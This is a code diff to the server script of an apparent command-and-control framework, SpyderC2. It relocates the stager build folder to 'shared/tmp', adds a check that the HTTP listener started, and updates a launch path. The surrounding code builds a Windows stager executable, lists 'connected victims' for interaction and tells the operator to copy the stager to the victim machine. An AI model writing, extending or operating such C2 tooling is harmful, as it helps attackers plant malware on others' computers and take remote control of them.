@@ -32,7 +32,7 @@ def display_main_help_menu():
 	print(' --------------------------------------')
 	print('|          SERVER HELP MENU            |')
 	print(' --------------------------------------')
-	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
+	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in shared/tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
 
 	for command in commands.keys():
 		print(colored(command,'cyan') + " - " + commands[command])
@@ -50,7 +50,7 @@ def fill_server_url():
 	stager_content = open(stager_path,'r').read()
 	stager_content = stager_content.replace("##SERVER_URL##",server_url)
 
-	new_stager_path = os.path.join(PATH,'tmp/stager.py')
+	new_stager_path = os.path.join(PATH,'shared','tmp','stager.py')
 
 	f = open(new_stager_path,'w+')
 	print(stager_content,file=f)
@@ -99,10 +99,10 @@ def delete_folder_contents(folder,server_logger):
 def generate_stager(server_logger):
 	
 	## Convert to exe and save
-	if os.path.exists(os.path.join(PATH,'tmp')):
-		if not delete_folder_contents(os.path.join(PATH,'tmp'),server_logger): return
+	if os.path.exists(os.path.join(PATH,'shared','tmp')):
+		if not delete_folder_contents(os.path.join(PATH,'shared','tmp'),server_logger): return
 	else:
-		os.mkdir(os.path.join(PATH,'tmp'))
+		os.mkdir(os.path.join(PATH,'shared','tmp'))
 
 	## For linux bianry : docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux
 
@@ -113,23 +113,23 @@ def generate_stager(server_logger):
 	## We fill in the User Provided server URL in tne stager.py and move it to tmp
 	fill_server_url()
 
-	if not check_file_existence(PATH,os.path.join('tmp','stager.py')): return
+	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.py')): return
 
 	## Copy files.
-	shutil.copyfile(os.path.join(PATH,'stager.spec'),os.path.join(PATH,'tmp','stager.spec'))
-	shutil.copyfile(os.path.join(PATH,'requirements.txt'),os.path.join(PATH,'tmp','requirements.txt'))
+	shutil.copyfile(os.path.join(PATH,'stager.spec'),os.path.join(PATH,'shared','tmp','stager.spec'))
+	shutil.copyfile(os.path.join(PATH,'requirements.txt'),os.path.join(PATH,'shared','tmp','requirements.txt'))
 
-	if not check_file_existence(PATH,os.path.join('tmp','stager.spec')): return
-	if not check_file_existence(PATH,os.path.join('tmp','requirements.txt')): return
+	if not check_file_existence(PATH,os.path.join('shared','tmp','stager.spec')): return
+	if not check_file_existence(PATH,os.path.join('shared','tmp','requirements.txt')): return
 
 
 	
 	try:
 		if not docker():
-			subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=rf"{os.path.join(PATH,'tmp')}",shell=True)
-			print(colored(f"exe dumped to {colored('<path_to_SpyderC2>/data/tmp/dist/windows','cyan')}.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
+			subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
+			print(colored(f"exe dumped to {colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')}.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
-			print(colored("\nPlease run the following command:"+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows','cyan')+" in "+colored('<path_to_SpyderC2>/data/tmp','cyan')+" directory on the host machine. The stager will be generated in "+ colored('<path_to_SpyderC2>/data/tmp/dist/windows','cyan')+". Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
+			print(colored("\nPlease run the following command:"+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','cyan')+" directory on the host machine. The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')+". Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
 
@@ -147,8 +147,12 @@ def main(args,db_object,server_logger):
 		if cmd == 'http':
 			h = Listener(port="8080")
 			
-			h.start_listener()
-			server_logger.info_log("Started http listener.",'green')
+			ret = h.start_listener()
+
+			if ret:
+				server_logger.info_log("Started http listener.",'green')
+			else:
+				server_logger.info_log("Failed to start http listener. Check logs",'yellow')
 
 		elif cmd == 'listeners':
 			Listener.show_listeners()
@@ -235,7 +239,7 @@ if __name__=="__main__":
 	server_logger.launch_logs_screen()
 	
 
-	if docker(): server_logger.info_log(f"Please launch the server by running - {colored('sudo docker exec -it spyderc2_server python3 SpyderC2/main.py','cyan')} ")
+	if docker(): server_logger.info_log(f"Please launch the server by running - {colored('sudo docker exec -it spyderc2_server python3 /home/attacker/SpyderC2/main.py','cyan')} ")
 	
 
 	db_url = get_db_info(server_logger)
@@ -251,6 +255,10 @@ if __name__=="__main__":
 	Listener.mongoclient = db_object.mongoclient
 	Victim.mongoclient = db_object.mongoclient
 	Task.mongoclient = db_object.mongoclient
+
+
+	if not os.path.exists(os.path.join(PATH,'shared')):
+		os.mkdir(os.path.join(PATH,'shared'))
 
 	try:
 		main(args,db_object,server_logger)
